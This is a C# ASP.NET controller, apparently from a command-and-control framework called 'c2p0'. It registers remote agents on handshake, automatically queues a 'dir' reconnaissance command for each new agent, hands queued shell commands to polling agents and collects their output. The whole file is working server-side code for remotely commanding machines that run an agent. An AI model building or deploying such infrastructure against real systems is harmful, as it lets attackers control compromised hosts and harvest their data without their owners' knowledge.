using c2p0.Lib.Interfaces;
using c2p0.Lib.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;

namespace c2p0.Web.Controllers
{
    public class ListenerController : Controller
    {
        private readonly IAgentManager agentManager;
        private readonly IJobManager jobManager;
        private readonly IListener listener;
        public ListenerController(IAgentManager am, IJobManager jm, IListener _listener)
        {
            agentManager = am;
            jobManager = jm;
            listener = _listener;
        }
        public ActionResult Index()
        {
            return Ok("thanks");
        }
        public ActionResult Handshake(string agentGuid, string hostName)
        {
            agentManager.AddAgent(new Agent()
            {
                AgentGuid = agentGuid,
                ListenerGuid = listener.ListenerGuid,
                HostName = hostName
            });

            jobManager.CreateJob(agentGuid, "dir");

            return Ok("thanks");
        }

        public ActionResult GetJob(string agentGuid)
        {
            var agent = agentManager.GetAgentById(agentGuid);

            var job = jobManager.GetJob(agentGuid);

            if (job == null) return Ok();
            return Ok(new Dictionary<string, string>()
            {
                { "id", job.JobGuid },
                { "command", job.Command }
            });
        }

        public ActionResult CompleteJob(string agentGuid, string jobGuid, string response)
        {
            jobManager.CompleteJob(jobGuid, agentGuid, response);

            return Ok();
        }
    }
}
